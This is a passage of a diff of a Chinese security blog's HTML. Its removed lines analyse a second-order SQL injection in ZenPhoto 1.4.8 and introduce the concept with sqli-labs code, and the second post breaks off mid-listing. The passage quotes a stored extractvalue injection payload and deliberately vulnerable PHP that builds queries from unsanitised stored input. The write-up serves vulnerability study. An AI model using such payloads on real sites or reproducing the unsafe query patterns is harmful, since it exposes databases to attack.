$album;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $albums = $curAlbum-&gt;getAlbums(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array($albums)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($albums <span class="keyword">as</span> $folder) &#123;</span><br><span class="line">            $album = newAlbum($folder);</span><br><span class="line">            <span class="keyword">if</span> ($album-&gt;isDynamic()) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($rights == ALL_ALBUMS_RIGHTS) &#123;</span><br><span class="line">                    $list[$album-&gt;getFileName()] = $album-&gt;getTitle();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $list[$album-&gt;getFileName()] = $album-&gt;getTitle();</span><br><span class="line">                genAlbumList($list, $album, $rights); <span class="comment">/* generate for subalbums */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>$albumsprime = $_zp_gallery-&gt;getAlbums(0);</code>，这里有个我们熟悉的类实例<code>$_zp_gallery</code>，跟进<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlbums</span><span class="params">($page = <span class="number">0</span>, $sorttype = null, $direction = null, $care = true, $mine = NULL)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Have the albums been loaded yet?</span></span><br><span class="line">    <span class="keyword">if</span> ($mine || is_null($this-&gt;albums) || $care &amp;&amp; $sorttype . $direction !== $this-&gt;lastalbumsort) &#123;</span><br><span class="line"></span><br><span class="line">        $albumnames = $this-&gt;loadAlbumNames();</span><br><span class="line">        $key = $this-&gt;getAlbumSortKey($sorttype);</span><br><span class="line">        $albums = $this-&gt;sortAlbumArray(<span class="keyword">NULL</span>, $albumnames, $key, $direction, $mine);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store the values</span></span><br><span class="line">        $this-&gt;albums = $albums;</span><br><span class="line">        $this-&gt;lastalbumsort = $sorttype . $direction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($page == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;albums;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> array_slice($this-&gt;albums, galleryAlbumsPerPage() * ($page - <span class="number">1</span>), galleryAlbumsPerPage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>$sorttype</code>变量值为<code>NULL</code>，注意这里的<code>$key</code>参数，这个就是被我们污染了的变量，跟进下<code>getAlbumSortKey</code>的由来，<code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAlbumSortKey</span><span class="params">($sorttype = null)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($sorttype)) &#123;</span><br><span class="line">        $sorttype = $this-&gt;getSortType();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lookupSortKey($sorttype, <span class="string">'sort_order'</span>, <span class="string">'albums'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>由于传入的<code>$sorttype</code>为<code>NULL</code>，所以进入了<code>if</code>判断，调用<code>getSortType</code>函数去了，跟进<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSortType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $type = $this-&gt;get(<span class="string">'gallery_sorttype'</span>);</span><br><span class="line">    <span class="keyword">return</span> $type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里回去调用<code>get</code>方法，并返回结果，所以找<code>get</code>方法去</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($field)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($this-&gt;data[$field])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;data[$field];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里传入一个<code>$field</code>，会返回<code>$this-&gt;data</code>值，而这个<code>$this-&gt;data</code>在构造函数中的实现为<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// Set our album directory</span></span><br><span class="line">    $this-&gt;albumdir = ALBUM_FOLDER_SERVERPATH;</span><br><span class="line">    $data = getOption(<span class="string">'gallery_data'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($data) &#123;</span><br><span class="line">        $this-&gt;data = getSerializedArray($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($this-&gt;data[<span class="string">'unprotected_pages'</span>])) &#123;</span><br><span class="line">        $pages = getSerializedArray($this-&gt;data[<span class="string">'unprotected_pages'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (is_array($pages))</span><br><span class="line">            $this-&gt;unprotected_pages = $pages; <span class="comment">//    protect against a failure</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>跟进<code>getOption</code>函数<br><code>/zenphoto-zenphoto-1.4.8/zp-core/functions-basic.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getOption</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_zp_conf_vars, $_zp_options;</span><br><span class="line">    $key = strtolower($key);</span><br><span class="line">    <span class="keyword">if</span> (is_null($_zp_options) &amp;&amp; function_exists(<span class="string">'query_full_array'</span>)) &#123; <span class="comment">// may be too early to use database!</span></span><br><span class="line">        <span class="comment">// option table not yet loaded, load it (but not the theme options!)</span></span><br><span class="line">        $sql = <span class="string">"SELECT `name`, `value` FROM "</span> . prefix(<span class="string">'options'</span>) . <span class="string">' WHERE (`theme`="" OR `theme` IS NULL) AND `ownerid`=0'</span>;</span><br><span class="line">        $optionlist = query_full_array($sql, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> ($optionlist !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            $_zp_options = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> ($optionlist <span class="keyword">as</span> $option) &#123;</span><br><span class="line">                $_zp_options[strtolower($option[<span class="string">'name'</span>])] = $option[<span class="string">'value'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_zp_options[$key])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $_zp_options[$key];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>它会去数据库的<code>options</code>表里面去取对应<code>$key</code>字段的<code>value</code>并返回，而我们传入的<code>$key=gallery_data</code>，得到<code>value</code>字段值为</p>
-<pre><code>a:21:{s:21:&quot;gallery_sortdirection&quot;;i:0;s:16:&quot;gallery_sorttype&quot;;s:56:&quot;id,extractvalue(0x0a,concat(0x0a,(select version())))%23&quot;;s:13:&quot;gallery_title&quot;;s:31:&quot;a:1:{s:5:&quot;en_US&quot;;s:6:&quot;相馆&quot;;}&quot;;s:19:&quot;Gallery_description&quot;;s:99:&quot;a:1:{s:5:&quot;en_US&quot;;s:73:&quot;You can insert your Gallery description on the Admin Options Gallery tab.&quot;;}&quot;;s:16:&quot;gallery_password&quot;;N;s:12:&quot;gallery_user&quot;;N;s:12:&quot;gallery_hint&quot;;N;s:10:&quot;hitcounter&quot;;N;s:13:&quot;current_theme&quot;;s:7:&quot;default&quot;;s:13:&quot;website_title&quot;;s:0:&quot;&quot;;s:11:&quot;website_url&quot;;s:0:&quot;&quot;;s:16:&quot;gallery_security&quot;;s:6:&quot;public&quot;;s:16:&quot;login_user_field&quot;;N;s:24:&quot;album_use_new_image_date&quot;;i:0;s:19:&quot;thumb_select_images&quot;;i:0;s:17:&quot;unprotected_pages&quot;;s:43:&quot;a:2:{i:0;s:8:&quot;register&quot;;i:1;s:7:&quot;contact&quot;;}&quot;;s:13:&quot;album_publish&quot;;i:1;s:13:&quot;image_publish&quot;;i:1;s:30:&quot;multilevel_thumb_select_images&quot;;i:0;s:14:&quot;sort_direction&quot;;i:0;s:9:&quot;codeblock&quot;;s:6:&quot;a:0:{}”;}
-</code></pre><p><img src="/images/zenphoto-7.png" alt="ZenPhoto-1"></p>
-<p>回到构造函数，这个值赋值给<code>$data</code>，然后传入<code>getSerializedArray</code>函数，跟进一下<br><code>/zenphoto-zenphoto-1.4.8/zp-core/functions-common.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSerializedArray</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^a:[0-9]+:&#123;/'</span>, $string)) &#123;</span><br><span class="line">        $r = @unserialize($string);</span><br><span class="line">        <span class="keyword">if</span> ($r) &#123;</span><br><span class="line">            <span class="keyword">return</span> $r;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strlen($string) == <span class="number">0</span> &amp;&amp; !is_bool($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里就是做一下简单的反序列化处理，以数组形式将结果返回。</p>
-<p>这样就得到<code>$this-&gt;data[‘gallery_sorttype’]</code>的值<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，也就是<code>$sorttype</code>的值为<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，即<code>$key</code>的值。</p>
-<p>接下来又调用了<code>sortAlbumArray</code>函数，找到该函数<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortAlbumArray</span><span class="params">($parentalbum, $albums, $sortkey = <span class="string">'`sort_order`'</span>, $sortdirection = NULL, $mine = NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count($albums) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null($mine) &amp;&amp; zp_loggedin(MANAGE_ALL_ALBUM_RIGHTS)) &#123;</span><br><span class="line">        $mine = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null($parentalbum)) &#123;</span><br><span class="line">        $albumid = <span class="string">' IS NULL'</span>;</span><br><span class="line">        $obj = $this;</span><br><span class="line">        $viewUnpublished = $mine;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $albumid = <span class="string">'='</span> . $parentalbum-&gt;getID();</span><br><span class="line">        $obj = $parentalbum;</span><br><span class="line">        $viewUnpublished = (zp_loggedin() &amp;&amp; $obj-&gt;albumSubRights() &amp; (MANAGED_OBJECT_RIGHTS_EDIT | MANAGED_OBJECT_RIGHTS_VIEW));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (($sortkey == <span class="string">'`sort_order`'</span>) || ($sortkey == <span class="string">'RAND()'</span>)) &#123; <span class="comment">// manual sort is always ascending</span></span><br><span class="line">        $order = <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_null($sortdirection)) &#123;</span><br><span class="line">            $order = strtoupper($sortdirection) == <span class="string">'DESC'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $order = $obj-&gt;getSortDirection(<span class="string">'album'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">'SELECT * FROM '</span> . prefix(<span class="string">"albums"</span>) . <span class="string">' WHERE `parentid`'</span> . $albumid . <span class="string">' ORDER BY '</span> . $sortkey . <span class="string">' '</span> . $sortdirection;</span><br><span class="line">    $result = query($sql);</span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//    check database aganist file system</span></span><br><span class="line">    <span class="keyword">while</span> ($row = db_fetch_assoc($result)) &#123;</span><br><span class="line">        $folder = $row[<span class="string">'folder'</span>];</span><br><span class="line">        <span class="keyword">if</span> (($key = array_search($folder, $albums)) !== <span class="keyword">false</span>) &#123; <span class="comment">// album exists in filesystem</span></span><br><span class="line">            $results[$row[<span class="string">'folder'</span>]] = $row;</span><br><span class="line">            <span class="keyword">unset</span>($albums[$key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// album no longer exists</span></span><br><span class="line">            $id = $row[<span class="string">'id'</span>];</span><br><span class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'albums'</span>) . <span class="string">" WHERE `id`=$id"</span>); <span class="comment">// delete the record</span></span><br><span class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'comments'</span>) . <span class="string">" WHERE `type` ='images' AND `ownerid`= '$id'"</span>); <span class="comment">// remove image comments</span></span><br><span class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'obj_to_tag'</span>) . <span class="string">"WHERE `type`='albums' AND `objectid`="</span> . $id);</span><br><span class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'albums'</span>) . <span class="string">" WHERE `id` = "</span> . $id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    db_free_result($result);</span><br><span class="line">    <span class="keyword">foreach</span> ($albums <span class="keyword">as</span> $folder) &#123; <span class="comment">// these albums are not in the database</span></span><br><span class="line">        $albumobj = newAlbum($folder);</span><br><span class="line">        <span class="keyword">if</span> ($albumobj-&gt;exists) &#123; <span class="comment">// fail to instantiate?</span></span><br><span class="line">            $results[$folder] = $albumobj-&gt;getData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    now put the results in the right order</span></span><br><span class="line">    $results = sortByKey($results, $sortkey, $order);</span><br><span class="line"><span class="comment">//    albums are now in the correct order</span></span><br><span class="line">    $albums_ordered = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($results <span class="keyword">as</span> $row) &#123; <span class="comment">// check for visible</span></span><br><span class="line">        $folder = $row[<span class="string">'folder'</span>];</span><br><span class="line">        $album = newAlbum($folder);</span><br><span class="line">        <span class="keyword">switch</span> (checkPublishDates($row)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                $album-&gt;setShow(<span class="number">0</span>);</span><br><span class="line">                $album-&gt;save();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                $row[<span class="string">'show'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($mine || $row[<span class="string">'show'</span>] || (($list = $album-&gt;isMyItem(LIST_RIGHTS)) &amp;&amp; is_null($album-&gt;getParent())) || (is_null($mine) &amp;&amp; $list &amp;&amp; $viewUnpublished)) &#123;</span><br><span class="line">            $albums_ordered[] = $folder;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $albums_ordered;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>至此，二阶注入的第二步分析完，完整的过程就是这样，最后看下mysql的执行log，之前存入的payload被执行了即触发了漏洞。</p>
-<p><img src="/images/zenphoto-8.png" alt="ZenPhoto-1"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>正如<code>exploit-db</code>上所说的，<code>ZenPhoto1.4.8</code>存在很多处二阶注入的地方。本质上仍然是在对用户可控的输入点过滤不够，过分依赖系统函数。</p>
-
+        
+          <a class="article-more-a" href="/2016/06/30/zenphoto-1-4-8-second-order-sql-injection/#more">more >></a>
+        
       
 
       
@@ -882,101 +705,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2016/06/30/zenphoto-1-4-8-second-order-sql-injection/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-Second-Order-SQL-Injection" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/22/Second-Order-SQL-Injection/">关于二阶 SQL 注入</a>
-    </h1>
-  
-
-        
-        <a href="/2016/06/22/Second-Order-SQL-Injection/" class="archive-article-date">
-  	<time datetime="2016-06-22T09:47:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-06-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>从乌云平台公开的案例来看，大部分的SQL注入漏洞均发生在单个HTTP请求和响应中，也就是说要触发漏洞，需经过以下步骤：</p>
-<ul>
-<li>客户端请求构造payload并发起请求</li>
-<li>服务端执行了payload</li>
-<li>客户端收到响应结果</li>
-</ul>
-<p>而二阶（Second Order）SQL注入相对来说更隐晦一些，需经过以下步骤：</p>
-<ul>
-<li>客户端构造payload并发起请求</li>
-<li>服务端存储payload</li>
-<li>客户端发起另一请求</li>
-<li>服务端执行了存储的payload</li>
-<li>客户端收到响应结果</li>
-</ul>
-<p>可以对比看到，二阶注入很隐蔽，很难被黑盒测试检测到，这也是现在各大漏洞平台二阶注入案例少的原因之一吧。</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>二阶可以理解为两步吧，当将用户的输入存储在某个地方，然后在另一处功能的SQL语句中使用它的时候，既没有进行正确的过滤也没有使用参数化查询，这就造成了二阶注入。至于它的影响的话和普通SQL注入没什么差别。</p>
-<p>下面代码来自于<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-labs</a> </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Less-5/index.php</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>代码里的<code>$id</code>被直接保存到了<code>result.txt</code>文件，为了更形象的表示出二阶注入，我新写了一个页面。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Less-5/second.php</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'result.txt'</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">while</span>(!feof($fp)) &#123;</span><br><span class="line">    $line = fgets($fp);</span><br><span class="line">    $arrId = explode(<span class="string">":"</span>, $line);</span><br><span class="line">    $id = trim($arrId[<span class="number">1</span>], <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    $sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span 